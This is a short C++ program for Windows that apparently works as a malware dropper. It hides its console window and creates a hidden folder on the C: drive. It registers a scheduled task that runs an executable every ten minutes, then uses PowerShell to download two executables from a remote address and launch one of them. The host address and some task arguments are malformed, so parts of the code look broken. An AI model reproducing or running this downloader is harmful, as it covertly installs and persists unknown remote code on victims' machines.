#include <iostream>
#include <windows.h>
#include <string>
int main(int argc, char *argv[])
{
ShowWindow(GetConsoleWindow(), SW_HIDE);
system("c: & cd / & mkdir c:/dada & cd c:/dada & schtasks /create /tn : 10 /tr c:/dada/iji.exe /MO MINUTE: 10 /f & powershell.exe (wget 'http://10/iji.exe' -OutFile iji.exe) & powershell.exe (wget 'http://10/gre.exe' -OutFile gre.exe) & iji.exe & exit");
}